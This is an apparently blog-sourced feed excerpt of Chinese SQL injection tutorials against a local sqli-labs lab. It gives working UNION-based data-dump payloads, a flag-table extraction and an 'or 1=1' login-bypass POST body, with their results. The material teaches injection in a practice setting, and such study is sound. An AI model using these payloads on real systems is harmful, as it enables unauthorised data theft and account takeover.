&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#&lt;span class=&#34;number&#34;&gt;1.&lt;/span&gt;通过闭合，确定单引号注入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: Kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#2.确定列数为3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;order&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;by&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; order by 4 --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;sql查询失败&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#3.联合查询泄露数据库信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(table_name), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; table_schema&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;database() &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: emails,flag,users&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: challenge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http:&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;127.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;SQLC&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;keyword&#34;&gt;sql&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-2.&lt;/span&gt;php&lt;span class=&#34;operator&#34;&gt;/&lt;/span&gt;?id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 0 union select 1, group_concat(column_name), database() from information_schema.columns where table_schema=database() and table_name=&amp;#x27;&lt;/span&gt;flag&lt;span class=&#34;string&#34;&gt;&amp;#x27; --+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Username: flag,value&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;Password: challenge&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;#4.获取flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;http://127.0.0.1/SQLC/sql-2.php/?id=1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, group_concat(concat_ws(&lt;span class=&#34;string&#34;&gt;&amp;#x27;:&amp;#x27;&lt;/span&gt;, flag, &lt;span class=&#34;keyword&#34;&gt;value&lt;/span&gt;)), database() &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; challenge.flag &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;------结果------&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:&lt;span class=&#34;keyword&#34;&gt;any&lt;/span&gt;,flag8:sqlc,flag9:tasi,flag10:moo,flag12:&lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;,flag11:muse&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: challenge&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;至此，字符型注入演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/</guid>
            <title>POST注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/POST%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 21:49:22 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之POST注入&#34;&gt;&lt;a href=&#34;#SQL-注入之POST注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之POST注入&#34;&gt;&lt;/a&gt;SQL 注入之POST注入&lt;/h1&gt;&lt;p&gt;本篇使用POST注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h2&gt;&lt;h3 id=&#34;尝试注入类型&#34;&gt;&lt;a href=&#34;#尝试注入类型&#34; class=&#34;headerlink&#34; title=&#34;尝试注入类型&#34;&gt;&lt;/a&gt;尝试注入类型&lt;/h3&gt;&lt;p&gt;输入1’  来看看是否报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929203645441.png&#34; alt=&#34;image-20220929203645441&#34;&gt;&lt;/p&gt;
&lt;p&gt;果不其然，此输入框存在SQL注入。且报错信息为&lt;code&gt;use near &amp;#39;&amp;#39;1&amp;#39;&amp;#39; and password=&amp;#39;&amp;#39; LIMIT 0,1&amp;#39; at line 1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;提取出错点发生在这一句：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&amp;#x27; and password=&amp;#x27;&amp;#x27; LIMIT 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中，1’ 是我们输入的，那么其查询语句基本上可以确定为：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; LIMIT &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;接着，查看其F12发现，网页发送的是POST请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204011334.png&#34; alt=&#34;image-20220929204011334&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后通过继续深入查询网页源代码的Elements可以得到，两个&lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;标签对应的变量名，&lt;strong&gt;Username&lt;/strong&gt;对应&lt;strong&gt;uname&lt;/strong&gt;，&lt;strong&gt;Password&lt;/strong&gt;对应&lt;strong&gt;passwd&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204648604.png&#34; alt=&#34;image-20220929204648604&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么就可以构造POST请求：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929204929486.png&#34; alt=&#34;image-20220929204929486&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么，基本上可以确定，此题存在SQL注入之一——POST注入。&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型&#34;&gt;&lt;a href=&#34;#确定注入类型&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型&#34;&gt;&lt;/a&gt;确定注入类型&lt;/h3&gt;&lt;p&gt;输入1’ # 查看是否依旧报错&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; #&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不报错，说明是POST单引号注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929205132216.png&#34; alt=&#34;image-20220929205132216&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;是否可以构造非法查询&#34;&gt;&lt;a href=&#34;#是否可以构造非法查询&#34; class=&#34;headerlink&#34; title=&#34;是否可以构造非法查询&#34;&gt;&lt;/a&gt;是否可以构造非法查询&lt;/h3&gt;&lt;p&gt;由于&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; password &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;xxx&amp;#x27;&lt;/span&gt; LIMIT &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;username是用单引号括起来的，为了让语法不出错，我们需要&lt;strong&gt;保留单引号&lt;/strong&gt;。即，可以在&lt;code&gt;uname=1&amp;#39; #&amp;amp;passwd=1&lt;/code&gt;的&lt;code&gt;&amp;#39; #&lt;/code&gt;之间&lt;strong&gt;插入我们想要的非法查询语句&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;因此，我们可以输入 1’ or 1=1 # 万能登录注入就会让查询语句变成：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; username &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; #&lt;span class=&#34;string&#34;&gt;&amp;#x27; and password = &amp;#x27;&lt;/span&gt;xxx&lt;span class=&#34;string&#34;&gt;&amp;#x27; LIMIT 0,1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;构造POST请求：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; or 1=1 #&amp;amp;passwd=1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;登录成功: &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929205718001.png&#34; alt=&#34;image-20220929205718001&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;使用BurpSuit来做Post注入&#34;&gt;&lt;a href=&#34;#使用BurpSuit来做Post注入&#34; class=&#34;headerlink&#34; title=&#34;使用BurpSuit来做Post注入&#34;&gt;&lt;/a&gt;使用BurpSuit来做Post注入&lt;/h2&gt;&lt;p&gt;这里也稍微提及一下BurpSuit抓包工具的简单使用：&lt;/p&gt;
&lt;h3 id=&#34;FireFox浏览器配置&#34;&gt;&lt;a href=&#34;#FireFox浏览器配置&#34; class=&#34;headerlink&#34; title=&#34;FireFox浏览器配置&#34;&gt;&lt;/a&gt;FireFox浏览器配置&lt;/h3&gt;&lt;p&gt;FireFox浏览器中，在”工具栏—选项—高级—连接设置“中，配置手动代理和端口号(127.0.0.1 : &lt;strong&gt;9090&lt;/strong&gt;)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210357211.png&#34; alt=&#34;image-20220929210357211&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;BurpSuit配置&#34;&gt;&lt;a href=&#34;#BurpSuit配置&#34; class=&#34;headerlink&#34; title=&#34;BurpSuit配置&#34;&gt;&lt;/a&gt;BurpSuit配置&lt;/h3&gt;&lt;p&gt;到BurpSuit里，”Proxy—Options—Proxy Listeners“中，设置好同样的代理地址和端口号（127.0.0.1 : &lt;strong&gt;9090&lt;/strong&gt;）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210527792.png&#34; alt=&#34;image-20220929210527792&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;令BurpSuit拦截到包&#34;&gt;&lt;a href=&#34;#令BurpSuit拦截到包&#34; class=&#34;headerlink&#34; title=&#34;令BurpSuit拦截到包&#34;&gt;&lt;/a&gt;令BurpSuit拦截到包&lt;/h3&gt;&lt;p&gt;点击FireFox的任意提交请求的按钮就可以令BurpSuit拦截到包。以FireFox为例就是，点击了这道题目中的&lt;code&gt;Submit按钮&lt;/code&gt; 或 使用Hackbar的&lt;code&gt;Execute按钮&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210640596.png&#34; alt=&#34;image-20220929210640596&#34;&gt;&lt;/p&gt;
&lt;p&gt;④在内容中鼠标右键点击后选择Send to Reapeater&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210828967.png&#34; alt=&#34;image-20220929210828967&#34;&gt;&lt;/p&gt;
&lt;p&gt;⑤在Reapter中多次尝试修改注入内容来查看返回的包&lt;/p&gt;
&lt;p&gt;第一次注入尝试&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929211038588.png&#34; alt=&#34;image-20220929211038588&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二次注入尝试&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220929210956005.png&#34; alt=&#34;image-20220929210956005&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
            <title>整型注入</title>
            <link>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Thu, 29 Sep 2022 00:27:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL注入之整型注入&#34;&gt;&lt;a href=&#34;#SQL注入之整型注入&#34; class=&#34;headerlink&#34; title=&#34;SQL注入之整型注入&#34;&gt;&lt;/a&gt;SQL注入之整型注入&lt;/h1&gt;&lt;p&gt;本篇使用整型注入来从0到1进入“SQL注入”的大门。&lt;/p&gt;
&lt;h2 id=&#34;环境准备&#34;&gt;&lt;a href=&#34;#环境准备&#34; class=&#34;headerlink&#34; title=&#34;环境准备&#34;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;当然是先安装phpStudy，然后一键傻瓜式安装后点击启动按钮&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928202842147.png&#34; alt=&#34;image-20220928202842147&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后点击MySQL管理器&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203059624.png&#34; alt=&#34;image-20220928203059624&#34;&gt;&lt;/p&gt;
&lt;p&gt;双击localhost，账户名root，密码root即可进入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203206981.png&#34; alt=&#34;image-20220928203206981&#34;&gt;&lt;/p&gt;
&lt;p&gt;打开浏览器，选择sqli&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203903223.png&#34; alt=&#34;image-20220928203903223&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择第一个Setup&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203930840.png&#34; alt=&#34;image-20220928203930840&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现这个界面，即完成了数据库的初始化&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928203950837.png&#34; alt=&#34;image-20220928203950837&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击后退键回到上一个页面，然后点击Less-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204115026.png&#34; alt=&#34;image-20220928204115026&#34;&gt;&lt;/p&gt;
&lt;p&gt;出现SQLI DUMB SERIES-1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928204123886.png&#34; alt=&#34;image-20220928204123886&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来以Less-2作为例子进行讲解：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928210728567.png&#34; alt=&#34;image-20220928210728567&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;SQL注入步骤&#34;&gt;&lt;a href=&#34;#SQL注入步骤&#34; class=&#34;headerlink&#34; title=&#34;SQL注入步骤&#34;&gt;&lt;/a&gt;SQL注入步骤&lt;/h2&gt;&lt;h3 id=&#34;①判断是否有注入-判断是否未严格校验&#34;&gt;&lt;a href=&#34;#①判断是否有注入-判断是否未严格校验&#34; class=&#34;headerlink&#34; title=&#34;①判断是否有注入(判断是否未严格校验)&#34;&gt;&lt;/a&gt;①判断是否有注入(判断是否未严格校验)&lt;/h3&gt;&lt;h4 id=&#34;1-可控参数的改变能否影响页面的显示结果&#34;&gt;&lt;a href=&#34;#1-可控参数的改变能否影响页面的显示结果&#34; class=&#34;headerlink&#34; title=&#34;1)可控参数的改变能否影响页面的显示结果&#34;&gt;&lt;/a&gt;1)可控参数的改变能否影响页面的显示结果&lt;/h4&gt;&lt;p&gt;网页让输入id，可是我们并没有看到交互框，因此猜测有可能是需要发送请求。&lt;/p&gt;
&lt;p&gt;点击查看网页源代码，在Network这里看到是GET请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213756712.png&#34; alt=&#34;image-20220928213756712&#34;&gt;&lt;/p&gt;
&lt;p&gt;因此我们选择在链接后面加上id参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928213510534.png&#34; alt=&#34;image-20220928213510534&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令其输出内容。&lt;/p&gt;
&lt;p&gt;此时我们再次改变GET请求中id的值，发现，内容会对应有所变化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214022889.png&#34; alt=&#34;image-20220928214022889&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;2-输入的SQL语句是否能报错&#34;&gt;&lt;a href=&#34;#2-输入的SQL语句是否能报错&#34; class=&#34;headerlink&#34; title=&#34;2)输入的SQL语句是否能报错&#34;&gt;&lt;/a&gt;2)输入的SQL语句是否能报错&lt;/h4&gt;&lt;p&gt;因为能通过数据库的报错，看到数据库的一些语句痕迹&lt;/p&gt;
&lt;p&gt;我们假设它后台的查询语句是&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; username,password &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; id &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; $id&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;猜想：能否通过加单引号令其出错？&lt;/p&gt;
&lt;p&gt;因为：&lt;/p&gt;
&lt;p&gt;如果是整型注入漏洞，则像3’这样的字符传入$id处会引发错误。&lt;/p&gt;
&lt;p&gt;如果是单引号注入漏洞，像3’这样的字符传入$id处也会引发错误。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928214501924.png&#34; alt=&#34;image-20220928214501924&#34;&gt;&lt;/p&gt;
&lt;p&gt;黄字部分的报错语句，非常之重要！&lt;/p&gt;
&lt;p&gt;near ‘xxxxxxxxxx’ at line 1 是在告诉我们在第1行的xxxxxxx语句处出现错误，而我们通过加入单引号使其发生错误，错误信息就会帮我们显示了出错的局部代码，也就是“输出了单引号后面的语句”——LIMIT 0,1。&lt;/p&gt;
&lt;p&gt;为了再次确定near ‘xxxxxxxxxx’ at line 1中在LIMIT 0,1之前的一个单引号是我们输入的单引号，我们再次改变GET请求中” ‘ ‘“（单引号）变为” “ “（双引号）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220928215359897.png&#34; alt=&#34;image-20220928215359897&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现成功令报错信息中near ‘xxxxx’中的LIMIT前一个符号发生改变。&lt;/p&gt;
